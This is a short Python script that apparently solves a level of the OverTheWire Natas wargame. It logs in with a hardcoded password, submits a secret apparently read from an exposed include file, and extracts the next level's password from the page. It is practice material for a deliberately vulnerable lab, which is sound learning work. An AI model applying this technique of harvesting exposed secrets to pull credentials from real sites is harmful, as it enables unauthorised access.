import requests
import re

usrname = 'natas6'
passwd = 'aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1'

url = "http://%s.natas.labs.overthewire.org/" % usrname

session = requests.Session()

#response = session.get(url + 'includes/secret.inc', auth = (usrname, passwd))
response = session.post(url, data = {'secret' : 'FOEIUWGHFEEUHOFUOIU', 'submit' : 'submit'}, auth = (usrname, passwd))
content = response.text

#print(content)

print re.findall('The password for natas7 is (.*)' , content)[0]
